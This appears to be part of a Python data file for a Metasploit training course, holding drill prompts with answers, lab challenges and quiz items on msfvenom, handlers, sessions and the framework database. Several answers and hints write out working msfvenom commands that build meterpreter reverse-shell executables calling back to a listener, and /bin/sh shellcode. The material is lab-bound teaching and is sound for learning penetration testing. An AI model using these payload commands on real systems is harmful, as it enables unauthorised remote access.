        {'id': 'msd-venom-exe', 'type': 'command',
         'prompt': 'Generate a Windows x64 meterpreter reverse exe to payload.exe.',
         'answer': 'msfvenom -p windows/x64/meterpreter/reverse_tcp '
                   'LHOST=10.0.0.2 LPORT=4444 -f exe -o payload.exe',
         'teach': 'LHOST and LPORT are bare key=value arguments, not flags. '
                  'That is the part everyone gets wrong first.'},
        {'id': 'msd-venom-elf', 'type': 'command',
         'prompt': 'Generate a Linux x64 meterpreter reverse ELF to payload.elf.',
         'answer': 'msfvenom -p linux/x64/meterpreter/reverse_tcp '
                   'LHOST=10.0.0.2 LPORT=4444 -f elf -o payload.elf',
         'teach': 'Same shape across platforms. Wrong architecture usually '
                  'produces silence rather than an error.'},
        {'id': 'msd-venom-formats', 'type': 'command',
         'prompt': 'List the output formats msfvenom supports.',
         'answer': 'msfvenom --list formats',
         'teach': 'Also --list payloads and --list encoders. Long enough to '
                  'be worth piping to grep.'},
        {'id': 'msd-venom-badchars', 'type': 'command',
         'prompt': 'Generate raw shellcode avoiding null bytes.',
         'answer': 'msfvenom -p linux/x64/exec CMD=/bin/sh -f raw -b "\\x00" '
                   '-o sc.bin',
         'teach': '-b is about what the delivery path can carry. It is not '
                  'evasion.'},
        {'id': 'msd-dbstatus', 'type': 'command',
         'prompt': 'Check whether the framework database is connected.',
         'answer': 'db_status',
         'teach': 'Without it, hosts and services are silently empty rather '
                  'than erroring.'},
        {'id': 'msd-workspace', 'type': 'command',
         'prompt': 'Create a new workspace called lab-corp.',
         'answer': 'workspace -a lab-corp',
         'teach': 'Trivial at the start and painful to retrofit. Keeps two '
                  'pieces of work from contaminating each other.'},
        {'id': 'msd-dbnmap', 'type': 'command',
         'prompt': 'Scan 10.0.0.0/24 with service detection, storing results.',
         'answer': 'db_nmap -sV 10.0.0.0/24',
         'teach': 'The same nmap, with the results in the database where '
                  'other modules can query them.'},
        {'id': 'msd-dbimport', 'type': 'command',
         'prompt': 'Import an existing nmap XML file called scan.xml.',
         'answer': 'db_import scan.xml',
         'teach': 'The concrete reason the nmap module tells you to keep the '
                  'XML.'},
        {'id': 'msd-services', 'type': 'command',
         'prompt': 'List stored services on port 445 that are up.',
         'answer': 'services -p 445 -u',
         'teach': 'Querying what you already found, rather than scanning '
                  'again.'},
        {'id': 'msd-spool', 'type': 'command',
         'prompt': 'Record everything the console prints to /tmp/msf.log.',
         'answer': 'spool /tmp/msf.log',
         'teach': 'Same argument as keeping nmap output. You will want it '
                  'later and cannot reconstruct it.'},
    ],

    'challenges': [
        {
            'id': 'msc-payload-names',
            'title': 'Read payload names correctly',
            'goal': 'Given a list of payload names, say for each whether it '
                    'is staged or stageless, reverse or bind, and what that '
                    'implies about the network.',
            'setup': {'kind': 'self'},
            'steps': [
                {'instruction': 'Write down these four: '
                                'windows/x64/meterpreter/reverse_tcp, '
                                'windows/x64/meterpreter_reverse_tcp, '
                                'linux/x64/shell/bind_tcp, '
                                'linux/x64/shell_reverse_tcp.'},
                {'instruction': 'For each, say staged or stageless, and how '
                                'you can tell from the name alone.'},
                {'instruction': 'For each, say which direction the connection '
                                'goes and therefore which firewall rule has '
                                'to permit it.'},
                {'instruction': 'Say which one you would choose if the target '
                                'cannot reach you at all, and which if the '
                                'space you can write into is very small.'},
                {'instruction': 'Check yourself with show payloads in the '
                                'console, or msfvenom --list payloads.'},
            ],
            'free': 'For four payload names, determine staged versus '
                    'stageless and reverse versus bind from the names, and '
                    'say what each implies about network direction and size.',
            'verify': {'kind': 'self'},
            'fallback': 'self',
        },
        {
            'id': 'msc-handler',
            'title': 'Generate a payload and catch it',
            'goal': 'The full loop outside an exploit: make a payload, start '
                    'a matching handler, run it on a lab VM, get a session.',
            'setup': {'kind': 'self'},
            'steps': [
                {'instruction': 'Find your own address on the lab network. '
                                'That is LHOST.',
                 'hint': 'ip -brief addr show'},
                {'instruction': 'Generate an ELF meterpreter reverse payload '
                                'for your lab Linux VM.',
                 'hint': 'msfvenom -p linux/x64/meterpreter/reverse_tcp '
                         'LHOST=... LPORT=4444 -f elf -o payload.elf'},
                {'instruction': 'Start multi/handler with exactly the same '
                                'payload, LHOST and LPORT, as a background '
                                'job.',
                 'hint': 'use exploit/multi/handler; set PAYLOAD ...; run -j'},
                {'instruction': 'Copy the payload to the lab VM and run it '
                                'there. You should get a session.'},
                {'instruction': 'Now deliberately break it: change LPORT on '
                                'the handler only, and observe what happens. '
                                'That is what a mismatch looks like.'},
            ],
            'free': 'On a lab VM: generate a payload with msfvenom, catch it '
                    'with a matching multi/handler, get a session, then '
                    'reproduce the mismatch failure on purpose.',
            'verify': {'kind': 'self'},
            'fallback': 'self',
        },
        {
            'id': 'msc-auxiliary',
            'title': 'Use the half of the framework that is not exploits',
            'goal': 'Do a whole enumeration pass with auxiliary modules only, '
                    'and store it in the database.',
            'setup': {'kind': 'self'},
            'steps': [
                {'instruction': 'Check db_status and set the database up if '
                                'it is not connected.'},
                {'instruction': 'Create a workspace for this lab and switch '
                                'to it.',
                 'hint': 'workspace -a lab; workspace lab'},
                {'instruction': 'Scan your lab range into the database with '
                                'db_nmap, with service detection.'},
                {'instruction': 'Find and run at least three auxiliary '
                                'scanners against what you found. Nothing '
                                'from exploit/.',
                 'hint': 'search type:auxiliary scanner'},
                {'instruction': 'Query the results with hosts and services, '
                                'filtered by port.'},
            ],
            'free': 'On a lab network: set up the database and a workspace, '
                    'scan into it, run three auxiliary scanners, and query '
                    'the stored results by port.',
            'verify': {'kind': 'self'},
            'fallback': 'self',
        },
        {
            'id': 'msc-session-work',
            'title': 'Live in a session properly',
            'goal': 'Get a session on a lab target and practise the session '
                    'management that people never learn: backgrounding, post '
                    'modules, and coming back.',
            'setup': {'kind': 'self'},
            'steps': [
                {'instruction': 'Get a meterpreter session on a lab VM by any '
                                'route you like.'},
                {'instruction': 'Run sysinfo and getuid. Write down both.'},
                {'instruction': 'Background the session with Ctrl-Z, then '
                                'list your sessions and interact with it '
                                'again.'},
                {'instruction': 'Run a post module against it, noting that it '
                                'wants SESSION rather than RHOSTS.',
                 'hint': 'use post/multi/gather/env; set SESSION 1; run'},
                {'instruction': 'Drop to a native shell with shell, then '
                                'return to meterpreter.'},
                {'instruction': 'Compare with a plain shell payload session: '
                                'get one, and list what you cannot do in it.'},
            ],
            'free': 'On a lab target: hold a meterpreter session, background '
                    'and resume it, run a post module against it, drop to a '
                    'native shell and back, then contrast it with a plain '
                    'shell payload.',
            'verify': {'kind': 'self'},
            'fallback': 'self',
        },
        {
            'id': 'msc-troubleshoot',
            'title': 'Diagnose "no session was created"',
            'goal': 'Reproduce the framework\'s most common failure '
                    'deliberately, three different ways, so you recognise '
                    'each on sight.',
            'setup': {'kind': 'self'},
            'steps': [
                {'instruction': 'Get a working exploit or payload on your lab '
                                'first, so you know the baseline works.'},
                {'instruction': 'Break it by setting LHOST to an address the '
                                'target cannot reach. Record the message.'},
                {'instruction': 'Break it by mismatching the payload between '
                                'msfvenom and the handler. Record the '
                                'message.'},
                {'instruction': 'Break it by blocking the return port on your '
                                'own firewall. Record the message.'},
                {'instruction': 'Note that all three look similar from the '
                                'console, and write down how you would '
                                'distinguish them in future.'},
                {'instruction': 'Turn on VERBOSE and spool the console while '
                                'doing this, and see what the log adds.'},
            ],
            'free': 'On a lab: produce "Exploit completed, but no session was '
                    'created" three different ways, record what each looks '
                    'like, and write down how you would tell them apart.',
            'verify': {'kind': 'self'},
            'fallback': 'self',
        },
        {
            'id': 'msc-build-lab',
            'title': 'Build the lab, on its own network',
            'goal': 'Before any of the above, have somewhere legitimate to do '
                    'it, isolated and snapshotted.',
            'setup': {'kind': 'self'},
            'steps': [
                {'instruction': 'Create a host-only or internal network with '
                                'no route to anything else.'},
                {'instruction': 'Stand up Metasploitable, or a Vulhub '
                                'container, or an evaluation Windows VM on '
                                'that network only.'},
                {'instruction': 'Confirm reachability in both directions, and '
                                'confirm from the lab that it cannot reach '
                                'your real network.'},
                {'instruction': 'Snapshot the target in a clean state before '
                                'you touch it.'},
                {'instruction': 'Write down your own address on that network. '
                                'It is LHOST for everything that follows.'},
            ],
            'free': 'Build an isolated lab network with a deliberately '
                    'vulnerable target, verify it cannot reach anything real, '
                    'snapshot it clean, and record your LHOST.',
            'verify': {'kind': 'self'},
            'fallback': 'self',
        },
    ],

    'quiz': [
        {'id': 'msq-types', 'type': 'mcq',
         'prompt': 'Which module type holds scanners that do not attempt '
                   'execution?',
         'answer': 'auxiliary',
         'distractors': ['exploit', 'post', 'encoder'],
         'teach': 'auxiliary is larger than people expect and is where much '
                  'of the everyday value is.'},
        {'id': 'msq-staged', 'type': 'mcq',
         'prompt': 'What is the difference between '
                   'windows/meterpreter/reverse_tcp and '
                   'windows/meterpreter_reverse_tcp?',
         'answer': 'The first is staged and the second is stageless.',
         'distractors': ['The first is x86 and the second is x64.',
                         'The first is encrypted and the second is not.',
                         'They are aliases for the same payload.'],
         'teach': 'A slash means staged, an underscore means stageless. One '
                  'character, and it decides size and robustness.'},
        {'id': 'msq-bind', 'type': 'mcq',
         'prompt': 'The target is behind a firewall that blocks all inbound '
                   'connections. Which payload direction works?',
         'answer': 'Reverse, because the target connects out to you.',
         'distractors': ['Bind, because it listens locally on the target.',
                         'Either, since the framework negotiates the '
                         'direction.',
                         'Neither, without a pivot.'],
         'teach': 'Reverse is the default precisely because outbound is '
                  'usually easier than inbound.'},
        {'id': 'msq-nosession', 'type': 'mcq',
         'prompt': '"Exploit completed, but no session was created." What is '
                   'most likely wrong?',
         'answer': 'The payload could not get back to your handler.',
         'distractors': ['The exploit did not actually run.',
                         'The target is patched against this exploit.',
                         'The database is not connected.'],
         'teach': 'Check LHOST, LPORT, the payload matching the handler, and '
                  'the network between them, in that order.'},
        {'id': 'msq-rank', 'type': 'mcq',
         'prompt': 'What does a module rank of excellent describe?',
         'answer': 'Reliability, and that it should not crash the service.',
         'distractors': ['That it gives SYSTEM level access.',
                         'That it works on the widest range of versions.',
                         'That it is the most recently updated module.'],
         'teach': 'Rank is about risk to the target and repeatability, not '
                  'power. manual means it needs a human.'},
        {'id': 'msq-session-opt', 'type': 'mcq',
         'prompt': 'A post module refuses to run and asks for something you '
                   'have not set. What is it?',
         'answer': 'SESSION, because post modules run through a session '
                   'rather than against a host.',
         'distractors': ['RHOSTS, like every other module.',
                         'LHOST, so results can be returned.',
                         'PAYLOAD, since post modules carry their own.'],
         'teach': 'That difference between RHOSTS and SESSION catches '
                  'everyone the first time.'},
        {'id': 'msq-venom-args', 'type': 'mcq',
         'prompt': 'How are LHOST and LPORT passed to msfvenom?',
         'answer': 'As bare key=value arguments after the payload.',
         'distractors': ['As --lhost and --lport flags.',
                         'As -L and -P short flags.',
                         'Only through a resource file.'],
         'teach': 'msfvenom -p PAYLOAD LHOST=... LPORT=... -f exe -o out.exe. '
                  'The bare arguments are payload options.'},
        {'id': 'msq-encoder', 'type': 'mcq',
         'prompt': 'What is shikata_ga_nai actually for?',
         'answer': 'Avoiding bad characters in the delivery path.',
         'distractors': ['Evading modern antivirus.',
                         'Compressing the payload to fit smaller buffers.',
                         'Encrypting the payload in transit.'],
         'teach': 'Its decoder stub has been signatured for years. Iterating '
                  'it produces a bigger file that is detected just as fast.'},
        {'id': 'msq-ctrlz', 'type': 'mcq',
         'prompt': 'You are in a session and want to run another module '
                   'without losing it. What do you press?',
         'answer': 'Ctrl-Z, to background the session.',
         'distractors': ['Ctrl-C, to interrupt the session.',
                         'Ctrl-D, to detach cleanly.',
                         'exit, which returns to the console.'],
         'teach': 'Ctrl-C may kill it and exit ends it. Ctrl-Z is the one '
                  'that keeps it.'},
        {'id': 'msq-db', 'type': 'mcq',
         'prompt': 'The hosts command returns nothing after a scan. What is '
                   'the likely cause?',
         'answer': 'The database is not connected, so nothing was stored.',
         'distractors': ['The scan used nmap rather than db_nmap.',
                         'The workspace was deleted mid-scan.',
                         'hosts only shows hosts with open ports.'],
         'teach': 'db_status first. Without a database these commands are '
                  'silently empty rather than erroring.'},
    ],
}
